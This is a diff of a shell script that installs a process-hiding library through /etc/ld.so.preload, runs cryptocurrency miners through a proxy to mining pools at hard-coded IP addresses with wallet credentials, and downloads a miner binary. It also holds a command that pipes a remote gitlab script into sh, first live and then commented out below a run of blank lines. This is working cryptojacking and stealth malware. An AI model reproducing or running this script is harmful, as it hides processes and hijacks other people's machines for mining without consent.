@@ -57,4 +57,15 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & ./graftcp/graftcp wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./graftcp/graftcp ./webchain-miner -o 212.32.255.5:3333 -u 0x9dd1fe4d84105022fdd122612e9e8dfe80b29d89 -p 250 -t 4 --worker=$(echo $(shuf -i 1-20000 -n 1)) --donate-level=1%
+
+
+
+
+
+
+
+
+
+#curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
